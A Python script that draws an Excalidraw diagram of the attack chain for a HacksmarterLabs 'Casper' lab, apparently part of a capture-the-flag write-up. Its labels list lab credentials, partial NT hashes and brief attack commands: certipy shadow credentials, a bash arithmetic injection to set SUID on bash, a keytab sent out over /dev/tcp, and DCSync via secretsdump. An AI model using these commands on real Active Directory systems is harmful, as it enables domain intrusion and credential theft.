#!/usr/bin/env python3
"""
Generate an Excalidraw scene for the HacksmarterLabs Casper attack chain.

Outputs:  casper_attack_chain.excalidraw  (renders via tools/excalidraw_render/render.sh)

Vertical layout: time flows top-to-bottom in a single main column, with two
short side branches (the AD CS enrollment group on the right, SRV_ADMINS on
the left) placed next to the node they belong to so no arrow crosses an
unrelated shape.

Design conventions match images/hacksmarter_nova-forge/build_attack_chain.py
and images/hackthebox_garfield/build_attack_chain.py so every diagram in the
repo reads as the same visual system.
"""

import json
import random
import time

random.seed(1337)

def rid():
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))

def now_ms():
    return int(time.time() * 1000)

# ---------- palette (dark canvas + light pastel "sticky note" nodes) --------

BG_COLOR      = "#1e1e1e"
USER_FILL,    USER_STROKE     = "#fff3bf", "#f08c00"   # warm yellow / orange
COMP_FILL,    COMP_STROKE     = "#a5d8ff", "#1864ab"   # cool blue
GROUP_FILL,   GROUP_STROKE    = "#d0bfff", "#5f3dc4"   # violet
ARTIFACT_FILL,ARTIFACT_STROKE = "#ffd8a8", "#d9480f"   # peach
LABEL_FILL,   LABEL_STROKE    = "#2b2b2b", "#5a5a5a"   # dark badge, subtle border
NODE_TEXT     = "#1e1e1e"                              # dark text on pastel node
LABEL_TEXT    = "#e9ecef"                              # light text on dark badge
TITLE_COLOR   = "#adb5bd"                              # neutral light grey

PHASE_COLORS = {
    "recon":    "#51cf66",   # green      - unauthenticated port scan
    "foothold": "#69db7c",   # lt green   - GitLab commit + CI environment
    "acl":      "#4dabf7",   # blue       - attribute-level ACL abuse
    "adcs":     "#b197fc",   # violet     - AD CS + altSecurityIdentities
    "upn":      "#ff922b",   # orange     - userPrincipalName / NT_ENTERPRISE
    "local":    "#ffa94d",   # amber      - GSSAPI ssh + sudo script -> root
    "da":       "#ff5252",   # bright red - CVE-2026-54121 -> DCSync
}

FONT_FAMILY = 1
LINE_HEIGHT = 1.25

# ---------- element factories -----------------------------------------------

def base(kind, x, y, w, h, stroke, fill, *, fill_style="solid",
         stroke_style="solid", stroke_width=2, roundness_type=None):
    return {
        "id": rid(),
        "type": kind,
        "x": x, "y": y, "width": w, "height": h, "angle": 0,
        "strokeColor": stroke,
        "backgroundColor": fill,
        "fillStyle": fill_style,
        "strokeWidth": stroke_width,
        "strokeStyle": stroke_style,
        "roughness": 1,
        "opacity": 100,
        "groupIds": [], "frameId": None, "index": None,
        "roundness": {"type": roundness_type} if roundness_type else None,
        "seed": random.randint(1, 2**31 - 1),
        "version": 1,
        "versionNonce": random.randint(1, 2**31 - 1),
        "isDeleted": False,
        "boundElements": [],
        "updated": now_ms(),
        "link": None,
        "locked": False,
    }

def text_elem(x, y, w, h, text, *, color=NODE_TEXT,
              container_id=None, size=18, align="center"):
    return {
        **base("text", x, y, w, h, color, "transparent"),
        "fontSize": size,
        "fontFamily": FONT_FAMILY,
        "text": text,
        "textAlign": align,
        "verticalAlign": "middle",
        "containerId": container_id,
        "originalText": text,
        "autoResize": True,
        "lineHeight": LINE_HEIGHT,
    }

def shape_with_label(kind, stroke, fill, x, y, w, h, label,
                     *, roundness=3, font_size=18, stroke_style="solid"):
    shape = base(kind, x, y, w, h, stroke, fill,
                 stroke_style=stroke_style, roundness_type=roundness)
    # Padding depends on shape geometry. Rectangles have their full box
    # available. Ellipses' inscribed rectangle is ~70% of the box, diamonds
    # taper to zero width at the vertices, so both need text pushed inward.
    if kind == "ellipse":
        pad_x, pad_y = 26, 12
    elif kind == "diamond":
        pad_x, pad_y = 44, 30
    else:
        pad_x, pad_y = 12, 10
    txt = text_elem(x + pad_x, y + pad_y, w - 2 * pad_x, h - 2 * pad_y, label,
                    container_id=shape["id"], size=font_size)
    shape["boundElements"] = [{"id": txt["id"], "type": "text"}]
    return shape, txt

def user_node(cx, cy, label, w=260, h=88):
    return shape_with_label("ellipse", USER_STROKE, USER_FILL,
                            cx - w/2, cy - h/2, w, h, label, font_size=17)

def computer_node(cx, cy, label, w=290, h=98):
    return shape_with_label("rectangle", COMP_STROKE, COMP_FILL,
                            cx - w/2, cy - h/2, w, h, label, font_size=17)

def group_node(cx, cy, label, w=310, h=150):
    return shape_with_label("diamond", GROUP_STROKE, GROUP_FILL,
                            cx - w/2, cy - h/2, w, h, label, font_size=17)

def artifact_node(cx, cy, label, w=340, h=98):
    return shape_with_label("rectangle", ARTIFACT_STROKE, ARTIFACT_FILL,
                            cx - w/2, cy - h/2, w, h, label,
                            font_size=14, stroke_style="dashed")

def edge_label(cx, cy, text, *, max_chars=None):
    lines = text.split("\n")
    line_w = max(len(l) for l in lines)
    if max_chars:
        line_w = min(line_w, max_chars)
    char_w, line_h = 7.2, 17
    w = max(140, int(line_w * char_w) + 22)
    h = max(28, len(lines) * line_h + 14)
    rect = base("rectangle", cx - w/2, cy - h/2, w, h,
                LABEL_STROKE, LABEL_FILL,
                stroke_width=1, roundness_type=3)
    txt = text_elem(cx - w/2 + 6, cy - h/2 + 6, w - 12, h - 12,
                    text, container_id=rect["id"], size=13,
                    color=LABEL_TEXT)
    rect["boundElements"] = [{"id": txt["id"], "type": "text"}]
    return [rect, txt], (w, h)

def _shape_edge_point(shape, tx, ty, gap=6):
    """
    Return the point on the shape's boundary where the line from the shape's
    centre toward (tx, ty) exits, plus a small outward `gap` so the arrowhead
    sits cleanly off the border. Handles rectangle / ellipse / diamond.
    """
    cx = shape["x"] + shape["width"] / 2
    cy = shape["y"] + shape["height"] / 2
    dx, dy = tx - cx, ty - cy
    if dx == 0 and dy == 0:
        return cx, cy

    kind = shape["type"]
    w, h = shape["width"], shape["height"]

    if kind == "ellipse":
        a, b = w / 2, h / 2
        t = 1.0 / ((dx / a) ** 2 + (dy / b) ** 2) ** 0.5
    elif kind == "diamond":
        t = 1.0 / (abs(dx) / (w / 2) + abs(dy) / (h / 2))
    else:  # rectangle
        hx, hy = w / 2, h / 2
        tx_edge = float("inf") if dx == 0 else hx / abs(dx)
        ty_edge = float("inf") if dy == 0 else hy / abs(dy)
        t = min(tx_edge, ty_edge)

    ex, ey = cx + t * dx, cy + t * dy
    d = (dx * dx + dy * dy) ** 0.5
    return ex + gap * dx / d, ey + gap * dy / d


def arrow(src, dst, *, color, label=None, label_side=1, label_dist=32,
          stroke_width=2.6):
    src_cx = src["x"] + src["width"] / 2
    src_cy = src["y"] + src["height"] / 2
    dst_cx = dst["x"] + dst["width"] / 2
    dst_cy = dst["y"] + dst["height"] / 2

    sx, sy = _shape_edge_point(src, dst_cx, dst_cy, gap=6)
    dx, dy = _shape_edge_point(dst, src_cx, src_cy, gap=6)

    arr = {
        **base("arrow", sx, sy, dx - sx, dy - sy, color, "transparent",
               stroke_width=stroke_width),
        "points": [[0, 0], [dx - sx, dy - sy]],
        "lastCommittedPoint": None,
        # gap:0 because the line is already clipped to the shape edge above;
        # a second edge-clip at render time would double-shorten the arrow.
        "startBinding": {"elementId": src["id"], "focus": 0, "gap": 0},
        "endBinding":   {"elementId": dst["id"], "focus": 0, "gap": 0},
        "startArrowhead": None,
        "endArrowhead": "arrow",
        "elbowed": False,
    }
    src["boundElements"] = (src.get("boundElements") or []) + [
        {"id": arr["id"], "type": "arrow"}]
    dst["boundElements"] = (dst.get("boundElements") or []) + [
        {"id": arr["id"], "type": "arrow"}]

    out = [arr]
    if label:
        mx = (sx + dx) / 2
        my = (sy + dy) / 2
        ax, ay = dx - sx, dy - sy
        L = (ax * ax + ay * ay) ** 0.5 or 1.0
        nx, ny = -ay / L * label_side, ax / L * label_side
        lx = mx + nx * label_dist
        ly = my + ny * label_dist
        label_elems, _ = edge_label(lx, ly, label)
        out += label_elems
    return out

# ---------- scene layout ----------------------------------------------------
#
# Single main column at MAIN_X, arrows flow strictly downward.
# RIGHT_X holds the AD CS branch (enrollment group + issued certificate).
# LEFT_X holds the unauthenticated start and the SRV_ADMINS group.

MAIN_X  = 900
LEFT_X  = 330
RIGHT_X = 1520

Y = {
    "attacker":  240,
    "gitlab":    420,
    "commit":    640,
    "cienv":     880,
    "xjr":      1120,
    "jags":     1340,
    "ccu":      1340,   # RIGHT lane, next to jags
    "pfx":      1580,   # RIGHT lane, feeds jay
    "jay":      1620,
    "gmsa":     1880,
    "carlito":  2140,
    "points":   2400,
    "srv":      2400,   # LEFT lane, next to points
    "nix01":    2680,
    "keytab":   2920,
    "dc01":     3180,
    "admin":    3440,
}

elements = []

# --- unauthenticated start ------------------------------------------------

attacker, attacker_t = user_node(LEFT_X, Y["attacker"], "attacker\n(unauth, VPN only)", w=280)
gitlab,   gitlab_t   = computer_node(MAIN_X, Y["gitlab"],
                                     "NIX01  10.0.18.19\nGitLab CE :80  (ssh :22)", w=360)

# --- GitLab foothold ------------------------------------------------------

commit, commit_t = artifact_node(MAIN_X, Y["commit"],
                                 "archived project 'Domain Joining Unix'\ncommit 34632ad3 (file later deleted)\nautomationtesting.sh -> xjr:xjrcat2026!",
                                 w=440, h=104)
cienv,  cienv_t  = artifact_node(MAIN_X, Y["cienv"],
                                 "private repo 'testing-gitlab'\nstopped CI environment 'Testing'\nDEPLOY_HOST=dc01  DEPLOY_PASS=fFvq52PzJpO98X8!",
                                 w=500, h=104)

# --- the AD identity chain -------------------------------------------------

xjr,     xjr_t     = user_node(MAIN_X, Y["xjr"], "xjr\n(domain user)", w=280)
jags,    jags_t    = user_node(MAIN_X, Y["jags"], "jags", w=240)
ccu,     ccu_t     = group_node(RIGHT_X, Y["ccu"],
                                "CasperCorp\nCertificateUsers", w=340, h=176)
pfx,     pfx_t     = artifact_node(RIGHT_X, Y["pfx"],
                                   "jags.pfx  (CasperCorp-User)\nEnrollee Supplies Subject: False\nissuer + serial are the only\nfields we need",
                                   w=400, h=116)
jay,     jay_t     = user_node(MAIN_X, Y["jay"], "jay", w=240)
gmsa,    gmsa_t    = computer_node(MAIN_X, Y["gmsa"], "casper-gmsa$\n(group managed service account)", w=420)
carlito, carlito_t = user_node(MAIN_X, Y["carlito"], "carlito\n:casper88!", w=280)
points,  points_t  = user_node(MAIN_X, Y["points"], "points\n(name only, via UPN)", w=320)
srv,     srv_t     = group_node(LEFT_X, Y["srv"], "SRV_ADMINS\n(sole member: points,\ngates ssh login)", w=340, h=190)

# --- Linux host and the last hop ------------------------------------------

nix01,  nix01_t  = computer_node(MAIN_X, Y["nix01"], "root on NIX01", w=300)
keytab, keytab_t = artifact_node(MAIN_X, Y["keytab"],
                                 "/root/krb5.keytab\nNIX01$ NT 0cf15e4eee91372a...",
                                 w=400)
dc01,   dc01_t   = computer_node(MAIN_X, Y["dc01"],
                                 "DC01$\nNT 55a83395647a19e6...", w=380)
admin,  admin_t  = user_node(MAIN_X, Y["admin"], "Administrator\n(domain compromise)", w=340)

elements += [
    attacker, attacker_t, gitlab, gitlab_t, commit, commit_t, cienv, cienv_t,
    xjr, xjr_t, jags, jags_t, ccu, ccu_t, pfx, pfx_t, jay, jay_t,
    gmsa, gmsa_t, carlito, carlito_t, points, points_t, srv, srv_t,
    nix01, nix01_t, keytab, keytab_t, dc01, dc01_t, admin, admin_t,
]

# ---------- edges (colour-coded by phase) -----------------------------------

edges = [
    (attacker, gitlab, "recon", +1, 40,
     "rustscan 22 / 80 / 8060 / 9094\nGitLab CE, anonymous /explore"),

    (gitlab, commit, "foothold", -1, 30,
     "Inactive tab lists archived projects\ngit keeps the deleted blob"),
    (commit, cienv, "foothold", -1, 34,
     "password is the GitLab one,\nnot the AD one -> sign in as xjr"),
    (cienv, xjr, "foothold", -1, 30,
     "kerbrute: xjr is a real AD user\nnxc ldap [+] with DEPLOY_PASS"),

    (xjr, jags, "acl", -1, 28,
     "WRITE msDS-KeyCredentialLink\ncertipy shadow auto"),

    (jags, ccu, "adcs", +1, 34, "memberOf"),
    (ccu, pfx, "adcs", +1, 30,
     "sole Enrollment Rights\ncertipy req -template CasperCorp-User"),
    (pfx, jay, "adcs", +1, 40,
     "xjr WRITEs altSecurityIdentities on jay\nX509:<I>issuer<SR>reversed-serial\ncertipy auth -pfx jags.pfx -username jay"),

    (jay, gmsa, "acl", -1, 28,
     "WRITE msDS-GroupMSAMembership\noverwrite the SD to grant xjr\nnxc ldap --gmsa"),
    (gmsa, carlito, "acl", -1, 28,
     "GenericWrite\ncertipy shadow auto -> NT hash"),

    (carlito, points, "upn", -1, 28,
     "KDC refuses RC4 pre-auth, so crack\nthe hash first -> casper88!\nset userPrincipalName = 'points'\ngetTGT.py -principalType NT_ENTERPRISE"),
    (points, srv, "upn", +1, 34, "memberOf -> SSSD\npermits the login"),

    (points, nix01, "local", -1, 28,
     "ssh -o GSSAPIAuthentication=yes\nNOPASSWD sudo rule on the user points\na[$(chmod +s /bin/bash)]  ->  /bin/bash -p"),
    (nix01, keytab, "local", -1, 28,
     "cat krb5.keytab > /dev/tcp/...\nkeytabExtractor2"),

    (keytab, dc01, "da", -1, 30,
     "certighost --computer-name nix01$\nMAQ=0, so reuse an existing computer\ncdc redirect (CVE-2026-54121) -> PKINIT"),
    (dc01, admin, "da", -1, 28,
     "secretsdump -just-dc-user administrator"),
]

for src, dst, phase, side, dist, lbl in edges:
    elements += arrow(src, dst, color=PHASE_COLORS[phase],
                      label=lbl, label_side=side, label_dist=dist)

# ---------- title + subtitle -----------------------------------------------

elements.append(text_elem(60, 40, 1800, 48,
    "HacksmarterLabs - Casper - Attack Chain",
    color=TITLE_COLOR, size=30, align="left"))
elements.append(text_elem(60, 92, 1800, 28,
    "Reads top-to-bottom. Main chain runs down the centre; the AD CS enrollment branch sits to the right of jags, SRV_ADMINS to the left of points.",
    color=TITLE_COLOR, size=14, align="left"))

# ---------- legend (shapes + phase colours) at the bottom -------------------

ly0 = Y["admin"] + 240
legend_shapes = [
    ("ellipse",   USER_STROKE,     USER_FILL,     "solid",  "user / principal"),
    ("rectangle", COMP_STROKE,     COMP_FILL,     "solid",  "computer / service account"),
    ("diamond",   GROUP_STROKE,    GROUP_FILL,    "solid",  "AD group"),
    ("rectangle", ARTIFACT_STROKE, ARTIFACT_FILL, "dashed", "artifact (credential / certificate / keytab)"),
]
for i, (shape, stroke, fill, sty, label) in enumerate(legend_shapes):
    row = i // 2
    col = i % 2
    sx = 60 + col * 900
    sy = ly0 + row * 60
    swatch = base(shape, sx, sy, 60, 36, stroke, fill,
                  stroke_style=sty, roundness_type=3)
    elements.append(swatch)
    elements.append(text_elem(sx + 76, sy + 4, 800, 28, label,
                              color=TITLE_COLOR, size=15, align="left"))

ly1 = ly0 + 160
elements.append(text_elem(60, ly1, 800, 28,
    "Arrow colours (attack phase):",
    color=TITLE_COLOR, size=16, align="left"))

phase_legend = [
    ("recon",    "unauthenticated port scan"),
    ("foothold", "GitLab: deleted commit + stopped CI environment"),
    ("acl",      "attribute-level ACL abuse (shadow credentials / gMSA / GenericWrite)"),
    ("adcs",     "AD CS enrollment + altSecurityIdentities explicit mapping"),
    ("upn",      "userPrincipalName spoofing (NT_ENTERPRISE ticket)"),
    ("local",    "GSSAPI ssh + bash arithmetic evaluation -> root on NIX01"),
    ("da",       "CertiGhost (CVE-2026-54121) -> DC01$ -> DCSync"),
]
for i, (phase, label) in enumerate(phase_legend):
    row = i // 2
    col = i % 2
    sx = 60 + col * 900
    sy = ly1 + 40 + row * 36
    swatch = base("rectangle", sx, sy + 10, 60, 6, PHASE_COLORS[phase],
                  PHASE_COLORS[phase], stroke_width=1, roundness_type=3)
    elements.append(swatch)
    elements.append(text_elem(sx + 76, sy, 800, 28, label,
                              color=TITLE_COLOR, size=14, align="left"))

# ---------- serialise --------------------------------------------------------

scene = {
    "type": "excalidraw",
    "version": 2,
    "source": "https://writeups.mhsferreira.com",
    "elements": elements,
    "appState": {
        "gridSize": 20,
        "gridStep": 5,
        "gridModeEnabled": False,
        "viewBackgroundColor": BG_COLOR,
    },
    "files": {},
}

OUT = "casper_attack_chain.excalidraw"
with open(OUT, "w") as f:
    json.dump(scene, f, indent=2)
print(f"[+] wrote {OUT}  ({len(elements)} elements)")
